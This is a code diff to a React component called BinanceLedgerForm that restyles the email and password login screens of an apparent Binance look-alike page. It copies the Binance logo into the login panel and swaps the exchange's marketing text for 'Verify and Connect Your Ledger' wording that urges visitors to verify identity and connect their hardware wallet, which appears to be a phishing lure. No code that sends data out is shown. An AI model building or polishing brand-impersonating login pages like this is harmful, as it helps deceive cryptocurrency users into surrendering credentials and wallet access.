@@ -478,37 +478,14 @@ const BinanceLedgerForm: FC = () => {
 
   const renderLoginEmail = () => (
     <div className="min-h-screen bg-[#0b0e11] flex">
-      {/* Top bar with Binance logo */}
-      <div className="absolute top-0 left-0 w-full z-10">
-        <div className="flex items-center justify-between p-6">
-          <div className="flex items-center">
-            <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
-              <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
-              <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
-              <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
-              <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
-              <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
-            </svg>
-            <span className="text-white text-2xl font-bold ml-3">Binance</span>
-          </div>
-          <div className="flex items-center space-x-4">
-            <div className="flex items-center text-[#848e9c] text-sm cursor-pointer">
-              <Globe className="w-4 h-4 mr-2" />
-              <span>English</span>
-            </div>
-          </div>
-        </div>
-      </div>
-
       {/* Left side - Marketing content */}
       <div className="flex-1 flex items-center justify-center px-16 pt-24">
         <div className="max-w-lg">
           <h1 className="text-white text-[56px] font-semibold leading-[64px] mb-6">
-            Buy, trade, and hold 350+ cryptocurrencies
+            Verify and Connect Your Ledger
           </h1>
           <p className="text-[#848e9c] text-xl leading-7 mb-8">
-            Join the world's largest crypto exchange
+            Secure your assets by verifying your identity and setting up a trusted connection between your wallet and your Ledger device.
           </p>
           <div className="space-y-4">
             <div className="flex items-center text-[#848e9c]">
@@ -530,6 +507,21 @@ const BinanceLedgerForm: FC = () => {
       {/* Right side - Login form */}
       <div className="w-[480px] bg-[#1e2329] pt-24">
         <div className="p-8">
+          {/* Binance logo at the top */}
+          <div className="flex justify-center mb-8">
+            <div className="flex items-center">
+              <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
+                <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
+                <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
+                <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
+                <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
+                <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
+              </svg>
+              <span className="text-white text-2xl font-bold ml-3">Binance</span>
+            </div>
+          </div>
+
           <div className="mb-8">
             <h2 className="text-white text-[32px] font-semibold mb-2">Log In</h2>
             <p className="text-[#848e9c] text-base">
@@ -605,37 +597,14 @@ const BinanceLedgerForm: FC = () => {
 
   const renderLoginPassword = () => (
     <div className="min-h-screen bg-[#0b0e11] flex">
-      {/* Top bar with Binance logo */}
-      <div className="absolute top-0 left-0 w-full z-10">
-        <div className="flex items-center justify-between p-6">
-          <div className="flex items-center">
-            <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
-              <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
-              <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
-              <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
-              <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
-              <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
-            </svg>
-            <span className="text-white text-2xl font-bold ml-3">Binance</span>
-          </div>
-          <div className="flex items-center space-x-4">
-            <div className="flex items-center text-[#848e9c] text-sm cursor-pointer">
-              <Globe className="w-4 h-4 mr-2" />
-              <span>English</span>
-            </div>
-          </div>
-        </div>
-      </div>
-
       {/* Left side - Marketing content */}
       <div className="flex-1 flex items-center justify-center px-16 pt-24">
         <div className="max-w-lg">
           <h1 className="text-white text-[56px] font-semibold leading-[64px] mb-6">
-            Buy, trade, and hold 350+ cryptocurrencies
+            Verify and Connect Your Ledger
           </h1>
           <p className="text-[#848e9c] text-xl leading-7 mb-8">
-            Join the world's largest crypto exchange
+            Secure your assets by verifying your identity and setting up a trusted connection between your wallet and your Ledger device.
           </p>
           <div className="space-y-4">
             <div className="flex items-center text-[#848e9c]">
@@ -657,6 +626,21 @@ const BinanceLedgerForm: FC = () => {
       {/* Right side - Login form */}
       <div className="w-[480px] bg-[#1e2329] pt-24">
         <div className="p-8">
+          {/* Binance logo at the top */}
+          <div className="flex justify-center mb-8">
+            <div className="flex items-center">
+              <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
+                <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
+                <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
+                <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
+                <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
+                <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
+              </svg>
+              <span className="text-white text-2xl font-bold ml-3">Binance</span>
+            </div>
+          </div>
+
           <div className="mb-8">
             <h2 className="text-white text-[32px] font-semibold mb-2">Log In</h2>
             <p className="text-[#848e9c] text-base">
